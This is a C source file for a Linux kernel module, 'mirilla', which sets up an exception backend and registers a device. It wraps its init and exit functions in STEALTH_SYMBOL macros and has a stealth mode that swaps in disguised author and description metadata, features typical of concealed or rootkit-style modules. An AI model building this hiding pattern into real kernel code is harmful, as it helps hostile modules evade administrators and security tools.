#include <linux/module.h>
#include <linux/kernel.h>

#include "mirilla-device.h"
#include "mirilla-except.h"
#include "mirilla-log.h"

static int __init mirilla_init(void)
{
    int mirilla_except_error_code;
    int mirilla_device_register_error_code;

    MIRILLA_LOG("initializing module");

    if (0 > (mirilla_except_error_code = mirilla_except_initialize())) {
        MIRILLA_ERROR("%04x: exception backend failed to initialize", mirilla_except_error_code);

        return mirilla_except_error_code;
    }

    if (0 > (mirilla_device_register_error_code = mirilla_device_register())) {
        MIRILLA_ERROR("%04x: primary device failed to register",
                      mirilla_device_register_error_code);

        mirilla_except_deinitialize();

        return mirilla_device_register_error_code;
    }

    MIRILLA_LOG("primary device registered successfully");

    return 0;
}

static void __exit mirilla_exit(void)
{
    int mirilla_device_unregister_error_code;

    MIRILLA_LOG("module exit start");

    if (0 > (mirilla_device_unregister_error_code = mirilla_device_unregister()))
        MIRILLA_ERROR("error(%04x): primary device failed to be unregistered correctly",
                      mirilla_device_unregister_error_code);

    mirilla_except_deinitialize();

    MIRILLA_LOG("module unloaded");
}

#define MIRILLA_MODULE_INIT(init_function) module_init(init_function)
#define MIRILLA_MODULE_EXIT(exit_function) module_exit(exit_function)

MIRILLA_MODULE_INIT(STEALTH_SYMBOL(mirilla_init, SYM_mirilla_init));
MIRILLA_MODULE_EXIT(STEALTH_SYMBOL(mirilla_exit, SYM_mirilla_exit));

#define MIRILLA_MODULE_AUTHOR(author) MODULE_AUTHOR(author)
#define MIRILLA_MODULE_DESCRIPTION(description) MODULE_DESCRIPTION(description)

#if defined(MIRILLA_STEALTH_MODE)
MIRILLA_MODULE_AUTHOR(MIRILLA_STEALTH_AUTHOR);
MIRILLA_MODULE_DESCRIPTION(MIRILLA_STEALTH_DESCRIPTION);
#else
MIRILLA_MODULE_AUTHOR("W. Frakchi");
MIRILLA_MODULE_DESCRIPTION("The kernel module for catalejo");
#endif
MODULE_LICENSE("GPL");
